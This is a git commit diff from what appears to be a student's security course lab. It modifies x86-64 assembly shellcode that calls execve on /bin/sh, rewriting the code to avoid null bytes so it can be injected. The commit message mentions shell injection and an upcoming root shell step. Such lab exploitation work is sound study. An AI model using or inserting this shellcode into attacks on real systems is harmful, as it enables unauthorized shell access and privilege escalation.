8eeea82f2c6979020a82854d672b1df5643c1d54
cohenchris <chris@chriscohen.dev>
2021-04-08 19:03:09 -0400

    finished shell injection, now only root shell left

--- cs426/lab3/shellcode.s
+++ cs426/lab3/shellcode.s
@@ -2,12 +2,17 @@
 
 .global _start
 _start:
-  movq  $0x68732f6e69622f, %rax # "hs/nib/" --> %rax
+  xor %rax, %rax                # nullify %rax
+  pushq %rax
+  movq $0x68732f6e69622f2f, %rax # "hs/nib/" --> %rax
   pushq %rax                    # push the sh command onto the stack
 
-  movq  $0x3b, %rax             # execve (
+  xor %rax, %rax
+  addq $0x3b, %rax              # execve (
   movq  %rsp, %rdi              #         /bin/sh ,
   xor   %rsi, %rsi              #         NULL ,
   xor   %rdx, %rdx              #         NULL
                                 #        )
   syscall
+
+.data
